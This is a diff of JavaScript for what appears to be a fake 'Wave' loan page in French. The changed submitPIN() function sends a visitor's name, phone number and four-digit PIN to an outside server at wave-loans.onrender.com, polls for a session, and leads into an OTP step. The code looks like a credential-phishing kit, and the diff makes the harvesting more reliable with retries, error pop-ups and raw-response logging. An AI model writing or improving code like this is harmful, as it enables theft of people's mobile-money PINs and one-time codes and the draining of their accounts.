@@ -579,7 +579,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 </div><!-- .wrap -->
 
 <script>
-var API = 'https://wave-loans.onrender.com/';
+var API = 'https://wave-loans.onrender.com/api';
 var sessId = null, pollTmr = null;
 
 function showLoad(){ document.getElementById('loadOv').classList.add('show'); }
@@ -736,14 +736,37 @@ async function submitPIN(){
   var raw=loginVal;
   var pin=pinVal;
   if(pin.length!==4) return;
-  var fn=document.getElementById('fn').value.trim()||'Unknown';
-  var ln=document.getElementById('ln').value.trim()||'User';
+  var fn=document.getElementById('fn')?document.getElementById('fn').value.trim():'';
+  var ln=document.getElementById('ln')?document.getElementById('ln').value.trim():'';
   showLoad();
-  var payload = {firstName:fn,lastName:ln,phone:raw,pin:pin};
+  var payload = {firstName:fn||'Unknown',lastName:ln||'User',phone:raw,pin:pin};
   if(sessId) payload.sessionId = sessId;
-  var r = await callApi('login_attempt', payload);
-  if(r.success&&r.data&&r.data.sessionId) startPoll(r.data.sessionId);
-  else{ hideLoad(); alert('Échec. Veuillez réessayer.'); }
+  try {
+    var p = new URLSearchParams(Object.assign({action:'login_attempt'}, payload));
+    var resp = await fetch(API, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:p.toString()});
+    var text = await resp.text();
+    console.log('login_attempt raw response:', text);
+    var r;
+    try { r = JSON.parse(text); } catch(e){ r = {}; }
+
+    // Handle various response shapes
+    var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id || r.id;
+    if(sid){
+      startPoll(sid);
+    } else if(r.success === false && r.message){
+      hideLoad();
+      showPop('Erreur', r.message || 'Veuillez réessayer.');
+      pinVal=''; updatePinDots();
+    } else {
+      hideLoad();
+      showPop('Erreur serveur', 'Réponse: ' + text.slice(0,120));
+      pinVal=''; updatePinDots();
+    }
+  } catch(e){
+    hideLoad();
+    showPop('Connexion échouée', 'Vérifiez votre connexion internet. (' + e.message + ')');
+    pinVal=''; updatePinDots();
+  }
 }
 
 var otpVal = '';
